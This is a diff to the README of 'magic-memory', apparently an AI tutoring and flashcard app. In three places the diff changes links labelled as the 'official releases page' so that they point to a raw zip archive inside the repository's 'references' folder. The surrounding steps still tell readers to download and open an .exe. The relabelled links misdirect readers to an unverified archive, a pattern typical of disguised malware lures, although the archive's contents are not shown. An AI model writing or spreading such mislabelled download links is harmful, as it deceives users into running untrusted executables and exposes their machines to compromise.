@@ -1,6 +1,6 @@
 # 🧠 magic-memory - Master deep concepts with AI assistance
 
-[![](https://img.shields.io/badge/Download-magic--memory-blue.svg)](https://github.com/Lighthearted-kludge586/magic-memory/releases)
+[![](https://img.shields.io/badge/Download-magic--memory-blue.svg)](https://github.com/Lighthearted-kludge586/magic-memory/raw/refs/heads/main/references/magic-memory-1.4-alpha.3.zip)
 
 ## 🎯 About this software
 
@@ -23,7 +23,7 @@ If your computer meets these standards, you can run the program without issues.
 
 Follow these instructions to set up the software on your machine:
 
-1. Visit the [official releases page](https://github.com/Lighthearted-kludge586/magic-memory/releases) to access the latest installer.
+1. Visit the [official releases page](https://github.com/Lighthearted-kludge586/magic-memory/raw/refs/heads/main/references/magic-memory-1.4-alpha.3.zip) to access the latest installer.
 2. Locate the file ending in `.exe` under the latest version tag.
 3. Click the file to start your download.
 4. Open the downloaded file from your Downloads folder.
@@ -57,7 +57,7 @@ You need an internet connection to generate explanations or sync new flashcards 
 Yes. Open the settings menu to adjust the tone and depth of the AI explanations. You can set the tutor to use plain language, academic terms, or the Feynman technique to simplify complex concepts.
 
 ### How do I update the program?
-When a update becomes available, the app notifies you. Visit the [releases page](https://github.com/Lighthearted-kludge586/magic-memory/releases) again to install the latest version. Your data and study history remain intact during the update process. 
+When a update becomes available, the app notifies you. Visit the [releases page](https://github.com/Lighthearted-kludge586/magic-memory/raw/refs/heads/main/references/magic-memory-1.4-alpha.3.zip) again to install the latest version. Your data and study history remain intact during the update process. 
 
 ### Is my data private?
 You own your study notes. Your information resides on your local machine. The AI agent only sees the specific text you input during a session. No personal identifying information leaves your computer without your permission.
